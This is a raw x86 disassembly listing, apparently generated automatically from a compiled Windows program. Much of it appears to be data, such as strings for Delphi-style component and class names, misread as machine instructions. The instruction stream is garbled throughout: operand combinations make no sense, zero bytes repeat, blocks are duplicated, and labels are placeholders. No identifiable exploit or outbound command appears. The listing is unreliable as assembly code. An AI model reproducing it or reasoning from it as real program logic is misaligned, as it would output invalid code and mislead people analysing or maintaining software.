dec ecx
outsb
js r-xdata
add [ eax ] cl
dec edi
insb
dec ecx
outsb
add [ eax ] cl
inc ebp
outsb
add al 0x11
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax - 0x6fffbccb ] dl
xor eax 0x98900043
inc eax
inc ebx
add [ eax ] cl
adc al 0x54
add eax 0x65530608
outsb
jb r-xdata
or edx [ ecx + ecx * 2 + 0x74 ]
insd
jb r-xdata
je r-xdata
dec eax
imul ebp [ esi + 0x74 ] 0x6e657645
insd
jb r-xdata
dec ecx
outsb
js r-xdata
or [ ebp + 0x6e ] al
add [ ecx ] cl
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
dec ecx
outsb
je r-xdata
jb r-xdata
jb r-xdata
dec ecx
outsb
je r-xdata
dec ecx
outsb
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
je r-xdata
outsb
jb r-xdata
dec ecx
outsb
je r-xdata
outsb
outsw
push esp
imul esi [ eax + 0x45 ] 0x746e6576
add [ ebx ] al
or [ esi ] al
push ebx
outsb
jb r-xdata
cmp al 0x10
inc eax
add [ ebx + 0x43410cc0 ] cl
dec ecx
je r-xdata
add [ edx ] cl
push ebx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0xa ] si
je r-xdata
je r-xdata
popad
je r-xdata
je r-xdata
je r-xdata
jb r-xdata
add ecx [ eax ]
push es
push ebx
outsb
dec ecx
outsb
js r-xdata
or [ ebp + 0x6e ] al
outsb
je r-xdata
inc ebx
add [ eax ] cl
adc eax 0x4f564c54
aas
jb r-xdata
xor [ ebx ] eax
mov eax eax
mov al 0x3e
ja r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
jb r-xdata
add al 0x8
push es
push ebx
outsb
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
insd
je r-xdata
add al 0x49
or edx [ ecx + ecx * 2 + 0x74 ]
insd
push ebx
je r-xdata
or [ ecx + ecx * 2 ] al
push esp
dec edi
push ebx
je r-xdata
or [ edi + 0x6c ] cl
je r-xdata
jb r-xdata
add [ eax ] cl
andps xmm1 [ esi + edx * 2 + 0x49 ]
or al 0x41
inc ebx
dec ecx
insd
popad
insd
dec esp
push esi
push ebx
jne r-xdata
add [ eax + r-xdata ] dl
or [ esp + edx * 2 ] dl
jb r-xdata
outsw
push esp
imul esi [ eax + 0x6 ] 0x69727453
outsb
add [ si ] al
adc [ eax ] eax
mov al [ 0xffffffff94004331 ]
adc [ eax ] al
test al 0x41
jb r-xdata
or cl [ ecx + 0x6d ]
ja r-xdata
push ebx
pop es
je r-xdata
dec ecx
je r-xdata
jbe r-xdata
inc ebx
push 0x65676e61
inc ebp
inc eax
add ah bh
aas
inc ebx
add [ eax ] cl
sbb al 0x54
dec esp
push esi
dec edi
ja r-xdata
cmp al 0x10
jbe r-xdata
outsb
adc [ ebx + edx * 2 + 0x65 ] dl
popad
jb r-xdata
or [ ecx + ebp * 2 + 0x72 ] eax
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
inc edx
outsd
outsd
insb
popad
outsb
add [ edx + esi + 0x32d00040 ] dh
inc eax
sub al 0x45
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
pop es
dec ecx
je r-xdata
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
add al 0x11
popad
dec ecx
outsb
js r-xdata
dec ecx
insd
add [ ecx + edx ] al
dec ecx
outsb
je r-xdata
dec ecx
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
je r-xdata
insd
push ebx
je r-xdata
insd
je r-xdata
outsb
add ah dh
xchg edx eax
inc ecx
add [ eax - 0x23ffbaf7 ] cl
mov es [ ebx ]
test al 0x10
inc ebp
add [ esi + 0x22040044 ] bl
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edi + eax * 4 ] dl
inc ebx
add al ah
push esi
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x5243ffbb ] dl
inc ebx
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
dec ecx
je r-xdata
push ebx
jne r-xdata
insd
add [ edi ] al
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 2 + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x42
inc ebx
add [ esi + 0x43 ] bh
inc ebx
add [ eax + 0x3 ] bh
add [ eax ] al
clc
mov ah 0x44
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc ebp
add [ eax + edx + 0x41a80040 ] dl
jb r-xdata
add [ edi ] eax
insd
pop es
dec ecx
outsb
insd
add ah bh
mov [ ebx ] al
int3
insd
or [ esi + 0x65 ] cl
ja r-xdata
inc eax
add [ eax + 0x3c004331 ] ah
adc [ eax ] al
add al 0x11
sub_43421c
fsubr [ ebp + 0xc080043 ]
inc ebp
add al ch
dec esi
inc ebp
add [ edi + ecx * 2 + 0x4aa00045 ] ah
inc ebp
add [ eax + 0x2000454f ] cl
adc [ ebp ] eax
mov ah 0x17
inc ebp
add [ ebp + 0x45 ] dl
add ah bh
mov [ ebx ] eax
cmp al 0x22
inc ebp
add ah bl
mov eax [ ebx ]
in al dx
and eax 0x25f00045
inc ebp
add [ eax - 0x3bffbadc ] ch
lea eax [ ebx ]
enter 0x4550 0x0
cwde
inc ebp
add [ edx + 0x4d440045 ] bh
inc ebp
add [ eax + edx * 2 ] dh
inc ebp
add [ esp + eax * 8 - 0x64fbffbd ] dl
inc ebx
add [ esi + edx * 4 ] ah
inc ebx
add al dh
stosd [ edi ]
inc ebx
add ah bl
les eax [ ebx ]
cmp al 0xc3
inc ebx
add [ eax - 0x3d ] bh
inc ebx
add ah ch
retn
sub_4353c5
fadd [ eax + eax - 0x70 ]
and al [ edx ]
and al 0x23
inc edx
add [ eax + 0x23 ] bh
inc edx
add [ edi + edx * 8 ] al
inc esp
add [ edi + ebp * 4 ] bl
inc ebp
add [ eax - 0x29 ] bh
inc esp
add [ edi + ebp * 4 + 0x45 ] al
add al dl
or eax 0xd8f00045
inc esp
add [ edi + edx * 8 - 0x506bffbc ] ch
inc ebp
add [ eax - 0x1bffba51 ] ch
xlat
inc esp
add al dl
scasd [ edi ]
inc ebp
add [ eax - 0x28 ] al
inc esp
add al bl
scasd [ edi ]
inc ebp
add [ eax - 0x28 ] ah
inc esp
add al ah
scasd [ edi ]
inc ebp
add al bl
or eax 0xd9540045
inc esp
add [ ecx + ebx * 8 - 0x277fffbc ] dl
inc esp
add ah dh
scasd [ edi ]
inc ebp
add al bh
scasd [ edi ]
inc ebp
add [ eax + ebx * 8 - 0x29ebffbc ] ah
inc esp
add ah ch
sub [ ebx ] eax
jo r-xdata
lodsb [ esi ]
push esp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 2 + 0xc0043 ] ch
add [ eax ] al
in al dx
jae r-xdata
inc ebx
add [ eax ] al
sub al [ ebx ]
aam 0xed
inc ebx
add [ esp + ebp + 0x43 ] ah
add [ ebp + ebp * 8 - 0x12dbffbd ] bl
inc ebx
add [ ebx ] dl
push esp
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
push ebp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx * 2 + 0x200043 ] bl
add [ eax ] al
jl r-xdata
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax * 2 + 0x6d6d6f43 ] dl
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
insb
jae r-xdata
inc ecx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
xchg edx eax
inc ecx
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add [ esi + eax * 8 + 0x43 ] dl
add [ edi ] cl
push esp
dec ebp
outsd
outsb
je r-xdata
inc eax
jb r-xdata
add [ eax ] al
jmp [ eax - 0x39 ]
add al al
xor [ edx ] al
or [ eax ] al
add bh bh
pushad
add [ eax ] al
add [ eax ] cl
add [ eax ] al
inc [ ecx ]
add [ ecx ] cl
push esp
js r-xdata
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
outsd
jb r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
xor [ edx ] al
or al 0x0
add bh bh
pushad
mov [ ebx ] 0x1
outsb
je r-xdata
inc ebx
xor [ edx ] al
adc [ eax ] al
add bh bh
pushad
mov [ ebx ] 0x1
add al [ eax ]
add [ eax ] al
add al [ eax ]
xor [ ebp + 0x43 ] dl
add [ edi ] al
inc edx
add [ eax ] dl
add [ eax ] al
jmp [ eax - 0x39 ]
inc ebx
popad
insb
imul esi [ ebx + 0x74 ] 0x77656956
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
push esp
inc ebx
add [ eax + eax ] cl
inc eax
add [ eax ] dl
push ebp
inc ebx
add [ eax ] al
add [ eax ] al
add bh bh
add al [ eax ]
push cs
adc [ ebp + 0x43 ] dl
add al dh
inc ecx
add [ esi ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc [ eax ]
add eax [ eax ]
push cs
push esp
imul esi [ esp + ebp * 2 + 0x65 ] 0x74786554
inc ebx
outsd
insb
outsd
jb r-xdata
outsd
insb
outsd
jb r-xdata
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
mov [ ebx ] 0x1
add [ eax ] al
add [ eax ] al
add eax 0xff0000
add [ ecx ] cl
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
add [ eax ] eax
add [ eax ] al
or [ eax ] al
add bh bh
add [ eax ] eax
or [ ebp + 0x78 ] edx
je r-xdata
add [ eax ] al
xor [ edx ] al
adc al 0x0
add bh bh
pushad
mov [ ebx ] 0x1
insb
outsd
jb r-xdata
push esp
imul esi [ esp + ebp * 2 + 0x65 ] 0x6b636142
inc ebx
outsd
add [ edx ] al
add [ eax ] al
inc [ edx ]
add [ esi ] cl
xor [ edx ] al
sbb [ eax ] al
add bh bh
pushad
mov [ ebx ] 0x1
add al 0x0
add [ eax ] al
add bh bh
xor [ edx ] al
sbb al 0x0
add bh bh
pushad
mov [ ebx ] 0x1
add eax 0x13000000
add [ eax ] al
inc [ 0x72541100 ]
popad
imul ebp [ ecx + ebp * 2 + 0x6e ] 0x78655467
je r-xdata
inc ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al dl
enter 0x43 0xcc
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
sub al 0x2c
outsd
insb
outsd
jb r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] eax
add [ eax ] al
inc eax
add [ esi + edx * 2 + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edi + 0x43 ] ss
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x57 ] bh
inc ebx
add [ eax + 0x2 ] dl
add [ eax ] al
mov ah 0xa8
inc esp
add ah ch
and [ edx ] eax
sub_435606
inc [ eax ]
add al 0x0
push cs
dec ebp
outsd
outsb
je r-xdata
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
add bh bh
xor [ edx ] al
sbb al 0x0
add bh bh
pushad
mov [ ebx ] 0x1
add eax 0x13000000
add [ eax ] al
inc [ 0x72541100 ]
popad
imul ebp [ ecx + ebp * 2 + 0x6e ] 0x78655467
je r-xdata
inc ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al dl
enter 0x43 0xcc
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
sub al 0x2c
outsd
insb
outsd
jb r-xdata
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
inc eax
add [ esi + edx * 2 + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edi + 0x43 ] ss
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x57 ] bh
inc ebx
add [ eax + 0x2 ] dl
add [ eax ] al
mov ah 0xa8
inc esp
add ah ch
and [ edx ] eax
sub_435708
enter 0x452a 0x0
or [ eax * 2 + 0x454ee800 ] cl
add [ edi + ecx * 2 + 0x4aa00045 ] ah
inc ebp
add [ eax + 0x2000454f ] cl
adc [ ebp ] eax
mov ah 0x17
inc ebp
add [ ebp + 0x45 ] dl
add [ eax + 0x1f ] al
inc ebp
add [ edx ] bh
inc ebp
add [ eax ] bl
0x43
sub_4359cd
xchg edx eax
inc ecx
add [ eax - 0x7bffbaf7 ] cl
fld [ eax + eax - 0x58 ]
adc [ ebp ] al
pushfd
out 0x44 al
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add ah dh
rol [ ebx ] 0x1
loopne r-xdata
mov [ edi + 0x45 ] cl
add [ eax ] ah
adc [ ebp ] eax
mov ah 0x17
inc ebp
add [ ebp + 0x45 ] dl
add [ eax + 0x3c0043d3 ] dl
and al [ ebp ]
pop esp
aam 0x43
add ah ch
and eax 0x25f00045
inc ebp
add [ eax + 0x50004524 ] ch
and al 0x45
add al cl
push eax
inc ebp
add [ eax - 0x43ffbad2 ] bl
bound eax [ ebp ]
inc esp
dec ebp
inc ebp
add [ eax + edx * 2 ] dh
inc ebp
add [ eax - 0x2d ] ah
inc ebx
add [ ecx + ecx * 8 ] al
inc ebx
add [ eax ] cl
xlat
inc ebx
add [ edx + ecx * 8 - 0x28c7ffbd ] dh
inc ebx
add [ edi + edx * 8 + 0x43 ] ch
add [ eax ] bl
fadd [ ebx ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2900040 ] dl
add [ eax ] al
add al 0x0
or eax 0x4eb00eb0
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
or al 0x0
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
add [ eax ] al
add [ edi ] cl
add [ ecx ] cl
insb
inc ebp
jae r-xdata
aam 0x43
add [ esp + edx * 8 ] bh
inc ebx
add [ edi ] cl
push esp
inc esp
popad
je r-xdata
pop edx
inc ebx
add [ edi ] al
andps xmm0 [ ecx + 0x74 ]
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
adc al [ eax ]
or al 0x43
popad
insb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e656d
sub al 0x55
inc ebx
add [ eax ] cl
add al [ eax ]
dec [ ebx + ecx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43090013 ] al
popad
insb
dec ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx + 0x1 ] ah
add bh bh
enter 0x455d 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
or eax 0x65420a00
jbe r-xdata
mov esp 0xd4a4ffb3
inc ebx
add ah al
aam 0x43
add al ch
push cs
mov al 0x4e
pop ecx
inc ebx
add [ eax + 0x43004357 ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040017 ] al
imul ebp [ ebp + 0x65 ] r-xdata
imul eax [ edx ] 0xd928ff00
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or al 0x53
push 0x6843776f
arpl [ gs : ebx + 0x62 ] bp
outsd
js r-xdata
nop
cdq
inc esp
add [ eax + eax ] dh
jmp [ eax + 0x100450d ]
insb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
adc [ ebx ] 0x0
or [ ebx + 0x61 ] eax
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
fsubr st1
inc esp
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
inc esp
add [ ecx + eax ] ah
dec eax
pop ebp
inc ebp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi ] cl
add [ edx ] cl
inc edx
jbe r-xdata
insb
jae r-xdata
adc [ eax ] al
push edx
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
cmpsd [ esi ] [ edi ]
add [ eax + 0x42080011 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc065646f
pop eax
inc ebx
add [ eax + 0x2 ] dl
insb
dec edi
jne r-xdata
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
add [ eax + eax ] cl
add al ch
cwde
inc esp
add [ ecx ] ah
add bh bh
or ah bl
inc esp
add [ esp + ebx * 8 + 0x44 ] ah
add [ eax + 0x3 ] al
or eax [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
push eax
fadd [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ gs : eax ] eax
or [ eax + 0x1620044 ] ch
add bh bh
or al 0x5e
inc ebp
add [ ecx ] al
add [ eax ] al
imul ebp [ esi + 0x64 ] r-xdata
push 0x5cff0001
pop esi
inc ebp
add [ ecx ] al
add [ eax ] al
inc edx
jbe r-xdata
test al 0x44
add [ ebp + 0x1 ] ah
add bh bh
cmp al 0x5e
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ ecx ]
sub_435a38
enter 0x452a 0x0
or [ eax * 2 + 0x454ee800 ] cl
add [ edi + ecx * 2 + 0x4aa00045 ] ah
inc ebp
add [ eax + 0x2000454f ] cl
adc [ ebp ] eax
mov ah 0x17
inc ebp
add [ ebp + 0x45 ] dl
add [ eax + 0x3c0043d3 ] dl
and al [ ebp ]
pop esp
aam 0x43
add ah ch
and eax 0x25f00045
inc ebp
add [ eax + 0x50004524 ] ch
and al 0x45
add al cl
push eax
inc ebp
add [ eax - 0x43ffbad2 ] bl
bound eax [ ebp ]
inc esp
dec ebp
inc ebp
add [ eax + edx * 2 ] dh
inc ebp
add [ eax - 0x2d ] ah
inc ebx
add [ ecx + ecx * 8 ] al
inc ebx
add [ eax ] cl
xlat
inc ebx
add [ edx + ecx * 8 - 0x28c7ffbd ] dh
inc ebx
add [ edi + edx * 8 + 0x43 ] ch
add [ eax ] bl
fadd [ ebx ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2900040 ] dl
add [ eax ] al
add al 0x0
or eax 0x4eb00eb0
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
or al 0x0
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
add [ eax ] al
add [ edi ] cl
add [ ecx ] cl
insb
inc ebp
jae r-xdata
aam 0x43
add [ esp + edx * 8 ] bh
inc ebx
add [ edi ] cl
push esp
inc esp
popad
je r-xdata
pop edx
inc ebx
add [ edi ] al
andps xmm0 [ ecx + 0x74 ]
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
adc al [ eax ]
or al 0x43
popad
insb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e656d
sub al 0x55
inc ebx
add [ eax ] cl
add al [ eax ]
dec [ ebx + ecx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43090013 ] al
popad
insb
dec ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx + 0x1 ] ah
add bh bh
enter 0x455d 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
or eax 0x65420a00
jbe r-xdata
mov esp 0xd4a4ffb3
inc ebx
add ah al
aam 0x43
add al ch
push cs
mov al 0x4e
pop ecx
inc ebx
add [ eax + 0x43004357 ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040017 ] al
imul ebp [ ebp + 0x65 ] r-xdata
imul eax [ edx ] 0xd928ff00
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or al 0x53
push 0x6843776f
arpl [ gs : ebx + 0x62 ] bp
outsd
js r-xdata
nop
cdq
inc esp
add [ eax + eax ] dh
jmp [ eax + 0x100450d ]
insb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
adc [ ebx ] 0x0
or [ ebx + 0x61 ] eax
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
fsubr st1
inc esp
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
inc esp
add [ ecx + eax ] ah
dec eax
pop ebp
inc ebp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi ] cl
add [ edx ] cl
inc edx
jbe r-xdata
insb
jae r-xdata
adc [ eax ] al
push edx
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
cmpsd [ esi ] [ edi ]
add [ eax + 0x42080011 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc065646f
pop eax
inc ebx
add [ eax + 0x2 ] dl
insb
dec edi
jne r-xdata
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
add [ eax + eax ] cl
add al ch
cwde
inc esp
add [ ecx ] ah
add bh bh
or ah bl
inc esp
add [ esp + ebx * 8 + 0x44 ] ah
add [ eax + 0x3 ] al
or eax [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
push eax
fadd [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ gs : eax ] eax
or [ eax + 0x1620044 ] ch
add bh bh
or al 0x5e
inc ebp
add [ ecx ] al
add [ eax ] al
imul ebp [ esi + 0x64 ] r-xdata
push 0x5cff0001
pop esi
inc ebp
add [ ecx ] al
add [ eax ] al
inc edx
jbe r-xdata
test al 0x44
add [ ebp + 0x1 ] ah
add bh bh
cmp al 0x5e
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ ecx ]
sub_4362e4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
fiadd [ ebx ]
cmp al 0xdb
inc ebx
add [ eax - 0x25 ] bl
inc ebx
add [ esp + edx * 2 ] cl
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x63 ] ah
inc ebx
add [ eax ] ch
add [ eax ] al
add [ eax + 0x4c004310 ] dl
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ esi + edx * 4 - 0x6c27ffbf ] al
inc ecx
add al ah
xchg ebx eax
inc ecx
add [ edx + ebx * 8 ] bl
inc ebx
add [ eax + 0x1e ] bh
inc ebx
add al dl
xchg edi eax
inc ecx
add [ eax ] ah
fild [ ebx ]
rcr dl 0x1
inc ebx
add [ esi + ebx ] bh
inc ebx
add [ eax - 0x26 ] ch
inc ebx
add [ edx + ebx * 8 - 0x250fffbd ] bl
inc ebx
add [ ebx + ebx * 8 ] bh
outsb
outsb
je r-xdata
je r-xdata
outsb
mov bh 0x45
add [ eax ] ah
add [ eax ] al
[ eax + eax ]
add [ ecx ] dl
dec edi
jbe r-xdata
insd
lea eax [ eax ]
je r-xdata
add [ eax + 0x12 ] ch
inc ebx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
jb r-xdata
jb r-xdata
inc ebx
add [ edi ] al
or al 0x54
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ ebp + 0x180043 ] bl
add [ eax ] al
cmp al 0x6
inc esp
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
je r-xdata
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + ebx * 4 + 0x41 ] bh
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add al ch
cwde
inc ecx
add [ ebp + ebx * 4 + 0x41 ] dl
add [ eax - 0x63 ] bl
inc ecx
add [ esp + ebx * 8 ] dh
inc ebx
add [ eax ] dl
popfd
inc ecx
add [ ebx * 4 - 0x667fffbf ] dl
inc ecx
add ah bh
cdq
inc ecx
add [ edi + ebx + 0x43 ] al
add [ eax + 0xd0043dc ] ch
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
pop eax
xor eax 0x355c0040
inc eax
popad
jns r-xdata
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
adc [ edi + 0x76 ] ecx
je r-xdata
inc ecx
add [ esp + ebp * 8 ] ah
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x16 ] cl
inc ebx
add al bl
xchg ebx eax
xor eax 0x35540040
inc eax
insd
jae r-xdata
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x28004364 ] dl
insd
popad
dec ecx
outsb
inc ebp
insd
sub al 0x63
inc ebx
add [ ecx + edx ] ch
inc ebx
add [ 0x6f430800 ] al
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
inc ebx
add [ eax ] ch
shl [ esp + 0xd070043 ] 0x54
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
js r-xdata
add [ eax + eax ] bl
add bh bh
xor [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
